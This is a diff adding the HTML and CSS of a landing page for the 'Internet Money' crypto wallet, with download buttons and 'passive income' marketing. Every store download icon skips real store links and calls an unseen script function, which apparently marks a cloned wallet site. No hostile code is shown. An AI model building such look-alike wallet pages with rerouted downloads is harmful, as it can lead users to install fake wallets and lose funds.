+              line-height: 1.75;
+              text-transform: uppercase;
+              min-width: 64px;
+              padding: 6px 16px;
+              border-radius: 4px;
+              -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              color: rgba(0, 0, 0, 0.87);
+              background-color: #ffdb0c;
+              box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2),
+                0px 2px 2px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+              background: #ffdb0c;
+              border-radius: 999px;
+              border: none;
+              color: #170d32;
+              height: 51px;
+              font-weight: bold;
+              vertical-align: middle;
+              max-width: 240px;
+              height: 51px;
+              width: 240px;
+            }
+
+            .css-1nak41x:hover {
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              background-color: #f8a61a;
+              box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2),
+                0px 4px 5px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 10px 0px rgba(0, 0, 0, 0.12);
+            }
+
+            @media (hover: none) {
+              .css-1nak41x:hover {
+                background-color: #ffdb0c;
+              }
+            }
+
+            .css-1nak41x:active {
+              box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2),
+                0px 8px 10px 1px rgba(0, 0, 0, 0.14),
+                0px 3px 14px 2px rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1nak41x.Mui-focusVisible {
+              box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2),
+                0px 6px 10px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 18px 0px rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1nak41x.Mui-disabled {
+              color: rgba(0, 0, 0, 0.26);
+              box-shadow: none;
+              background-color: rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1nak41x:hover {
+              background: #ffe653;
+            }
+
+            @media (max-width: 900px) {
+              .css-1nak41x {
+                display: none;
+              }
+            }
+          </style>
+          <style data-emotion="css 1rld6av">
+            .css-1rld6av {
+              display: -webkit-inline-box;
+              display: -webkit-inline-flex;
+              display: -ms-inline-flexbox;
+              display: inline-flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+              position: relative;
+              box-sizing: border-box;
+              -webkit-tap-highlight-color: transparent;
+              background-color: transparent;
+              outline: 0;
+              border: 0;
+              margin: 0;
+              border-radius: 0;
+              padding: 0;
+              cursor: pointer;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              vertical-align: middle;
+              -moz-appearance: none;
+              -webkit-appearance: none;
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              color: inherit;
+              font-family: Gotham, Orbitron, sans-serif;
+              font-weight: 500;
+              font-size: 0.875rem;
+              line-height: 1.75;
+              text-transform: uppercase;
+              min-width: 64px;
+              padding: 6px 16px;
+              border-radius: 4px;
+              -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              color: rgba(0, 0, 0, 0.87);
+              background-color: #ffdb0c;
+              box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2),
+                0px 2px 2px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+              background: #ffdb0c;
+              border-radius: 999px;
+              border: none;
+              color: #170d32;
+              height: 51px;
+              font-weight: bold;
+              vertical-align: middle;
+              max-width: 240px;
+              height: 51px;
+              width: 240px;
+            }
+
+            .css-1rld6av::-moz-focus-inner {
+              border-style: none;
+            }
+
+            .css-1rld6av.Mui-disabled {
+              pointer-events: none;
+              cursor: default;
+            }
+
+            @media print {
+              .css-1rld6av {
+                -webkit-print-color-adjust: exact;
+                color-adjust: exact;
+              }
+            }
+
+            .css-1rld6av:hover {
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              background-color: #f8a61a;
+              box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2),
+                0px 4px 5px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 10px 0px rgba(0, 0, 0, 0.12);
+            }
+
+            @media (hover: none) {
+              .css-1rld6av:hover {
+                background-color: #ffdb0c;
+              }
+            }
+
+            .css-1rld6av:active {
+              box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2),
+                0px 8px 10px 1px rgba(0, 0, 0, 0.14),
+                0px 3px 14px 2px rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1rld6av.Mui-focusVisible {
+              box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2),
+                0px 6px 10px 0px rgba(0, 0, 0, 0.14),
+                0px 1px 18px 0px rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1rld6av.Mui-disabled {
+              color: rgba(0, 0, 0, 0.26);
+              box-shadow: none;
+              background-color: rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1rld6av:hover {
+              background: #ffe653;
+            }
+
+            @media (max-width: 900px) {
+              .css-1rld6av {
+                display: none;
+              }
+            }
+          </style><button
+            class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-colorPrimary css-1rld6av"
+            tabindex="0" type="button" id="basic-button">
+            Download The Wallet</button>
+          <style data-emotion="css yyjj59">
+            .css-yyjj59 {
+              font-family: Gotham, Orbitron, sans-serif;
+              font-weight: 500;
+              font-size: 0.875rem;
+              line-height: 1.75;
+              text-transform: uppercase;
+              min-width: 64px;
+              padding: 5px 15px;
+              border-radius: 4px;
+              -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              border: 1px solid rgba(255, 219, 12, 0.5);
+              color: #ffdb0c;
+              background: #ffdb0c;
+              border-radius: 999px;
+              border: none;
+              color: #170d32;
+              height: 51px;
+              font-weight: bold;
+              vertical-align: middle;
+              background: transparent;
+              color: #ffdb0c;
+              border: 3px solid #ffdb0c;
+              width: 240px;
+            }
+
+            .css-yyjj59:hover {
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              background-color: rgba(255, 219, 12, 0.04);
+              border: 1px solid #ffdb0c;
+            }
+
+            @media (hover: none) {
+              .css-yyjj59:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-yyjj59.Mui-disabled {
+              color: rgba(0, 0, 0, 0.26);
+              border: 1px solid rgba(0, 0, 0, 0.12);
+            }
+
+            .css-yyjj59:hover {
+              background: #ffe653;
+            }
+
+            .css-yyjj59:hover {
+              color: black;
+            }
+
+            @media (max-width: 900px) {
+              .css-yyjj59 {
+                display: none;
+              }
+            }
+          </style>
+          <style data-emotion="css 1x6o1hr">
+            .css-1x6o1hr {
+              display: -webkit-inline-box;
+              display: -webkit-inline-flex;
+              display: -ms-inline-flexbox;
+              display: inline-flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+              position: relative;
+              box-sizing: border-box;
+              -webkit-tap-highlight-color: transparent;
+              background-color: transparent;
+              outline: 0;
+              border: 0;
+              margin: 0;
+              border-radius: 0;
+              padding: 0;
+              cursor: pointer;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              vertical-align: middle;
+              -moz-appearance: none;
+              -webkit-appearance: none;
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              color: inherit;
+              font-family: Gotham, Orbitron, sans-serif;
+              font-weight: 500;
+              font-size: 0.875rem;
+              line-height: 1.75;
+              text-transform: uppercase;
+              min-width: 64px;
+              padding: 5px 15px;
+              border-radius: 4px;
+              -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              border: 1px solid rgba(255, 219, 12, 0.5);
+              color: #ffdb0c;
+              background: #ffdb0c;
+              border-radius: 999px;
+              border: none;
+              color: #170d32;
+              height: 51px;
+              font-weight: bold;
+              vertical-align: middle;
+              background: transparent;
+              color: #ffdb0c;
+              border: 3px solid #ffdb0c;
+              width: 240px;
+            }
+
+            .css-1x6o1hr::-moz-focus-inner {
+              border-style: none;
+            }
+
+            .css-1x6o1hr.Mui-disabled {
+              pointer-events: none;
+              cursor: default;
+            }
+
+            @media print {
+              .css-1x6o1hr {
+                -webkit-print-color-adjust: exact;
+                color-adjust: exact;
+              }
+            }
+
+            .css-1x6o1hr:hover {
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              background-color: rgba(255, 219, 12, 0.04);
+              border: 1px solid #ffdb0c;
+            }
+
+            @media (hover: none) {
+              .css-1x6o1hr:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-1x6o1hr.Mui-disabled {
+              color: rgba(0, 0, 0, 0.26);
+              border: 1px solid rgba(0, 0, 0, 0.12);
+            }
+
+            .css-1x6o1hr:hover {
+              background: #ffe653;
+            }
+
+            .css-1x6o1hr:hover {
+              color: black;
+            }
+
+            @media (max-width: 900px) {
+              .css-1x6o1hr {
+                display: none;
+              }
+            }
+          </style><a
+            class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-colorPrimary css-1x6o1hr"
+            tabindex="0" href="https://t.me/internetmoneyio">Join Community</a>
+          <style data-emotion="css 1e9h435">
+            .css-1e9h435 {
+              cursor: pointer;
+              margin-right: 20px;
+              display: -webkit-box;
+              display: -webkit-flex;
+              display: -ms-flexbox;
+              display: flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+            }
+
+            @media (min-width: 1351px) {
+              .css-1e9h435 {
+                display: none;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-1e9h435">
+            <img alt="hamburger" loading="lazy" width="79" height="31" decoding="async" data-nimg="1"
+              style="color: transparent" src="_next/static/media/hamburger.084a1bc2.svg" />
+          </div>
+        </div>
+        <style data-emotion="css t20zit">
+          .css-t20zit {
+            z-index: 1200;
+            width: 100%;
+          }
+
+          .css-t20zit .MuiDrawer-paper {
+            width: 300px;
+            background: linear-gradient(0deg,
+                #000000 22.76%,
+                #0a254d 190.55%);
+          }
+
+          @media (max-width: 599.95px) {
+            .css-t20zit .MuiDrawer-paper {
+              width: 100%;
+            }
+          }
+        </style>
+      </div>
+      <style data-emotion="css vn0iz0">
+        .css-vn0iz0 {
+          positon: relative;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          margin: auto;
+          margin-top: 136px;
+          text-align: center;
+          z-index: 0;
+        }
+
+        @media (max-width: 599.95px) {
+          .css-vn0iz0 {
+            margin-top: 20px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-vn0iz0">
+        <style data-emotion="css 59jqp1">
+          .css-59jqp1 {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            left: 50%;
+            -webkit-transform: translate(-50%, 0);
+            -moz-transform: translate(-50%, 0);
+            -ms-transform: translate(-50%, 0);
+            transform: translate(-50%, 0);
+          }
+
+          .css-59jqp1 img {
+            object-fit: cover;
+            object-position: bottom;
+            width: 100%;
+            height: 1400px;
+            z-index: 0;
+            margin-right: auto;
+            margin-left: auto;
+          }
+
+          @media (max-width: 899.95px) {
+            .css-59jqp1 img {
+              -webkit-background-size: cover;
+              background-size: cover;
+              height: 1250px;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-59jqp1 img {
+              height: 1250px;
+              object-position: left;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-59jqp1"></div>
+        <div class="MuiBox-root css-0">
+          <div class="MuiBox-root css-59jqp1">
+            <img id="fallback" src="images/landing-hero.webp" alt="Static Image" />
+          </div>
+        </div>
+        <style data-emotion="css 17mqo56">
+          .css-17mqo56 {
+            margin: 0;
+            font-size: 1.3125rem;
+            font-weight: bold;
+            letter-spacing: -0.1rem;
+            font-family: Gotham, Orbitron, sans-serif;
+            line-height: 1.235;
+            line-height: inherit;
+            margin-bottom: 8px;
+            font-weight: 300;
+            letter-spacing: 0.3rem;
+          }
+
+          @media (min-width: 600px) {
+            .css-17mqo56 {
+              font-size: 1.417rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-17mqo56 {
+              font-size: 1.417rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-17mqo56 {
+              font-size: 1.6194rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-17mqo56 {
+              font-size: 1.6194rem;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-17mqo56 {
+              margin-left: 20px;
+              font-size: 20px;
+              letter-spacing: 0.6px;
+            }
+          }
+        </style>
+        <h4 class="MuiTypography-root MuiTypography-h4 css-17mqo56">
+          YOUR GATEWAY TO DEFI
+        </h4>
+        <style data-emotion="css q0m1v5">
+          .css-q0m1v5 {
+            margin: 0;
+            font-size: 1.75rem;
+            font-weight: bold;
+            letter-spacing: -0.1rem;
+            font-family: Gotham, Orbitron, sans-serif;
+            line-height: 1.167;
+            line-height: inherit;
+            font-weight: 700;
+            color: #00fee8;
+            text-transform: uppercase;
+            letter-spacing: 0.25rem;
+          }
+
+          @media (min-width: 600px) {
+            .css-q0m1v5 {
+              font-size: 2.1422rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-q0m1v5 {
+              font-size: 2.1422rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-q0m1v5 {
+              font-size: 2.3565rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-q0m1v5 {
+              font-size: 2.5707rem;
+            }
+          }
+
+          @media (max-width: 899.95px) {
+            .css-q0m1v5 {
+              width: 80%;
+              letter-spacing: 0.2rem;
+              margin-left: auto;
+              margin-right: auto;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-q0m1v5 {
+              width: 95%;
+              margin-left: 20px;
+              letter-spacing: 0;
+              font-size: 24px;
+            }
+          }
+        </style>
+        <h3 class="MuiTypography-root MuiTypography-h3 css-q0m1v5">
+          The First Crypto Wallet of Its Kind
+        </h3>
+        <style data-emotion="css 1g4qss0">
+          .css-1g4qss0 {
+            margin-top: 96px;
+            position: relative;
+            width: -webkit-fit-content;
+            width: -moz-fit-content;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+          }
+
+          @media (max-width: 599.95px) {
+            .css-1g4qss0 {
+              margin-top: 72px;
+            }
+
+            .css-1g4qss0 h1 {
+              font-size: 60px;
+            }
+          }
+
+          @media (max-width: 404px) {
+            .css-1g4qss0 h1 {
+              font-size: 50px;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-1g4qss0">
+          <style data-emotion="css 100auu1">
+            .css-100auu1 {
+              margin: 0;
+              font-size: 3.625rem;
+              font-weight: bold;
+              letter-spacing: -0.25rem;
+              font-family: Gotham, Orbitron, sans-serif;
+              line-height: 1.167;
+              text-align: center;
+              color: #ffdb0c;
+              font-weight: 900;
+              letter-spacing: 3.2px;
+            }
+
+            @media (max-width: 767px) {
+              .css-100auu1 {
+                letter-spacing: -0.05rem;
+              }
+            }
+
+            @media (min-width: 600px) {
+              .css-100auu1 {
+                font-size: 4.7129rem;
+              }
+            }
+
+            @media (min-width: 900px) {
+              .css-100auu1 {
+                font-size: 5.1414rem;
+              }
+            }
+
+            @media (min-width: 1200px) {
+              .css-100auu1 {
+                font-size: 5.5698rem;
+              }
+            }
+
+            @media (min-width: 1536px) {
+              .css-100auu1 {
+                font-size: 6.2125rem;
+              }
+            }
+          </style>
+          <h1 class="MuiTypography-root MuiTypography-h1 css-100auu1">
+            GET THE APP
+          </h1>
+          <style data-emotion="css 15upgqv">
+            .css-15upgqv {
+              position: absolute;
+              top: -100px;
+              right: 130px;
+            }
+
+            @media (max-width: 1535.95px) {
+              .css-15upgqv {
+                right: 140px;
+              }
+            }
+
+            @media (max-width: 1535px) {
+              .css-15upgqv {
+                right: 115px;
+              }
+            }
+
+            @media (max-width: 1199.95px) {
+              .css-15upgqv {
+                right: 105px;
+              }
+            }
+
+            @media (max-width: 900px) {
+              .css-15upgqv {
+                right: 90px;
+              }
+            }
+
+            @media (max-width: 767px) {
+              .css-15upgqv {
+                right: 80px;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-15upgqv">
+            <img alt="Alien sitting" width="100" height="180" data-nimg="1" style="color: transparent"
+              src="https://d295q1lbtarn4h.cloudfront.net/gifs/alien-sitting.gif" />
+          </div>
+        </div>
+        <style data-emotion="css 11fsxzq">
+          .css-11fsxzq {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            width: -webkit-fit-content;
+            width: -moz-fit-content;
+            width: fit-content;
+            margin: auto;
+            margin-top: 32px;
+          }
+
+          @media (max-width: 800px) {
+            .css-11fsxzq {
+              -webkit-flex-direction: column;
+              -ms-flex-direction: column;
+              flex-direction: column;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+            }
+          }
+
+          .css-11fsxzq img {
+            width: 300px;
+          }
+
+          @media (max-width: 599.95px) {
+            .css-11fsxzq img {
+              width: 200px;
+            }
+          }
+
+          @media (max-width: 945px) {
+            .css-11fsxzq {
+              -webkit-flex-direction: column;
+              -ms-flex-direction: column;
+              flex-direction: column;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-11fsxzq">
+          <style data-emotion="css 1wf493t">
+            .css-1wf493t {
+              text-align: center;
+              -webkit-flex: 0 0 auto;
+              -ms-flex: 0 0 auto;
+              flex: 0 0 auto;
+              font-size: 1.5rem;
+              padding: 8px;
+              border-radius: 50%;
+              overflow: visible;
+              color: rgba(0, 0, 0, 0.54);
+              -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            }
+
+            .css-1wf493t:hover {
+              background-color: rgba(0, 0, 0, 0.04);
+            }
+
+            @media (hover: none) {
+              .css-1wf493t:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-1wf493t.Mui-disabled {
+              background-color: transparent;
+              color: rgba(0, 0, 0, 0.26);
+            }
+          </style>
+          <style data-emotion="css 1yxmbwk">
+            .css-1yxmbwk {
+              display: -webkit-inline-box;
+              display: -webkit-inline-flex;
+              display: -ms-inline-flexbox;
+              display: inline-flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+              position: relative;
+              box-sizing: border-box;
+              -webkit-tap-highlight-color: transparent;
+              background-color: transparent;
+              outline: 0;
+              border: 0;
+              margin: 0;
+              border-radius: 0;
+              padding: 0;
+              cursor: pointer;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              vertical-align: middle;
+              -moz-appearance: none;
+              -webkit-appearance: none;
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              color: inherit;
+              text-align: center;
+              -webkit-flex: 0 0 auto;
+              -ms-flex: 0 0 auto;
+              flex: 0 0 auto;
+              font-size: 1.5rem;
+              padding: 8px;
+              border-radius: 50%;
+              overflow: visible;
+              color: rgba(0, 0, 0, 0.54);
+              -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            }
+
+            .css-1yxmbwk::-moz-focus-inner {
+              border-style: none;
+            }
+
+            .css-1yxmbwk.Mui-disabled {
+              pointer-events: none;
+              cursor: default;
+            }
+
+            @media print {
+              .css-1yxmbwk {
+                -webkit-print-color-adjust: exact;
+                color-adjust: exact;
+              }
+            }
+
+            .css-1yxmbwk:hover {
+              background-color: rgba(0, 0, 0, 0.04);
+            }
+
+            @media (hover: none) {
+              .css-1yxmbwk:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-1yxmbwk.Mui-disabled {
+              background-color: transparent;
+              color: rgba(0, 0, 0, 0.26);
+            }
+          </style><a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img alt="ios" loading="lazy"
+              width="0" height="30" decoding="async" data-nimg="1" style="color: transparent; height: auto"
+              src="_next/static/media/ios.bf451e7f.svg" /></a><a
+            class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img alt="android" loading="lazy"
+              width="0" height="0" decoding="async" data-nimg="1" style="color: transparent; height: auto"
+              src="_next/static/media/android.a305525d.svg" /></a><a
+            class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img
+              src="_next/static/media/chrome.331862c0.png" alt="chrome" /></a>
+        </div>
+      </div>
+      <style data-emotion="css 3vh8tp">
+        .css-3vh8tp {
+          -webkit-flex-direction: row;
+          -ms-flex-direction: row;
+          flex-direction: row;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: space-evenly;
+          -ms-flex-pack: space-evenly;
+          -webkit-justify-content: space-evenly;
+          justify-content: space-evenly;
+          max-width: 1920px;
+          margin-left: auto;
+          margin-right: auto;
+          margin-top: 560px;
+        }
+
+        @media (max-width: 899.95px) {
+          .css-3vh8tp {
+            -webkit-flex-direction: column;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            margin-left: auto;
+            margin-right: auto;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+          }
+        }
+
+        @media (max-width: 1535.95px) {
+          .css-3vh8tp {
+            margin-top: 720px;
+          }
+        }
+
+        @media (max-width: 1098px) {
+          .css-3vh8tp {
+            -webkit-flex-direction: column;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            width: 90%;
+            margin-top: 720px;
+          }
+        }
+
+        @media (max-width: 899px) {
+          .css-3vh8tp {
+            margin-top: 240px;
+          }
+        }
+
+        @media (max-width: 599.95px) {
+          .css-3vh8tp {
+            width: 90%;
+            margin-top: 480px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-3vh8tp">
+        <style data-emotion="css 8atqhb">
+          .css-8atqhb {
+            width: 100%;
+          }
+        </style>
+        <div class="MuiBox-root css-8atqhb">
+          <style data-emotion="css 1bgnnp4">
+            .css-1bgnnp4 {
+              position: relative;
+              padding-left: 96px;
+            }
+
+            @media (max-width: 1535.95px) {
+              .css-1bgnnp4 {
+                width: 95%;
+                margin: auto;
+                padding-left: 24px;
+              }
+            }
+
+            @media (max-width: 899.95px) {
+              .css-1bgnnp4 {
+                height: -webkit-fit-content;
+                height: -moz-fit-content;
+                height: fit-content;
+                width: 95%;
+                margin-top: 32px;
+                padding-left: 20px;
+              }
+            }
+
+            @media (max-width: 599.95px) {
+              .css-1bgnnp4 h1 {
+                font-size: 35px;
+                letter-spacing: -2px;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-1bgnnp4">
+            <style data-emotion="css 15v3gdt">
+              .css-15v3gdt {
+                margin: 0;
+                font-size: 3.625rem;
+                font-weight: bold;
+                letter-spacing: -0.25rem;
+                font-family: Gotham, Orbitron, sans-serif;
+                line-height: 1.167;
+                font-weight: 700;
+                color: white;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: left;
+                max-width: 1150px;
+                font-size: 82px;
+                z-index: 20;
+                position: relative;
+              }
+
+              @media (max-width: 767px) {
+                .css-15v3gdt {
+                  letter-spacing: -0.05rem;
+                }
+              }
+
+              @media (min-width: 600px) {
+                .css-15v3gdt {
+                  font-size: 4.7129rem;
+                }
+              }
+
+              @media (min-width: 900px) {
+                .css-15v3gdt {
+                  font-size: 5.1414rem;
+                }
+              }
+
+              @media (min-width: 1200px) {
+                .css-15v3gdt {
+                  font-size: 5.5698rem;
+                }
+              }
+
+              @media (min-width: 1536px) {
+                .css-15v3gdt {
+                  font-size: 6.2125rem;
+                }
+              }
+
+              .css-15v3gdt span {
+                color: #ffdb0c;
+                position: relative;
+              }
+
+              @media (max-width: 1258px) {
+                .css-15v3gdt {
+                  font-size: 70px;
+                }
+              }
+
+              @media (max-width: 899.95px) {
+                .css-15v3gdt {
+                  font-size: 60px;
+                }
+              }
+
+              @media (max-width: 599.95px) {
+                .css-15v3gdt {
+                  text-align: left;
+                  font-size: 35px;
+                  letter-spacing: -2px;
+                  margin-left: 0px;
+                }
+              }
+            </style>
+            <h2 class="MuiTypography-root MuiTypography-h1 css-15v3gdt">
+              What is The <span>Internet Money</span> Ecosystem?
+            </h2>
+            <style data-emotion="css 1hlnjj8">
+              .css-1hlnjj8 {
+                margin: 0;
+                font-size: 1.1875rem;
+                font-family: Gotham;
+                font-weight: 300;
+                line-height: 1.75;
+                line-height: inherit;
+                color: rgba(138, 155, 180, 1);
+                margin-top: 41px;
+                text-align: left;
+                max-width: 1150px;
+                font-size: 22px;
+                z-index: 20;
+                position: relative;
+              }
+
+              @media (min-width: 600px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 900px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 1200px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 1536px) {
+                .css-1hlnjj8 {
+                  font-size: 1.4286rem;
+                }
+              }
+
+              @media (max-width: 1098px) {
+                .css-1hlnjj8 {
+                  width: 95%;
+                }
+              }
+
+              @media (max-width: 599.95px) {
+                .css-1hlnjj8 {
+                  padding-top: 11px;
+                  margin-top: 16px;
+                  width: 100%;
+                  text-align: left;
+                  font-size: 17px;
+                }
+              }
+            </style>
+            <p class="MuiTypography-root MuiTypography-subtitle1 css-1hlnjj8">
+              The center of our ecosystem is the Internet Money Wallet. A
+              multi-chain EVM wallet, native to PulseChain. Privacy, Security
+              and Simplicity focused, with PASSIVE INCOME opportunities
+              through our innovative tokens.
+            </p>
+            <style data-emotion="css buloid">
+              .css-buloid {
+                margin-top: 40px;
+                display: -webkit-box;
+                display: -webkit-flex;
+                display: -ms-flexbox;
+                display: flex;
+                -webkit-flex-direction: column;
+                -ms-flex-direction: column;
+                flex-direction: column;
+                gap: 24px;
+              }
+
+              @media (max-width: 599.95px) {
+                .css-buloid .MuiAccordionSummary-root {
+                  padding-left: 1rem !important;
+                }
+              }
+            </style>
+            <div class="MuiBox-root css-buloid">
+              <style data-emotion="css 5s2o83">
+                .css-5s2o83 {
+                  position: relative;
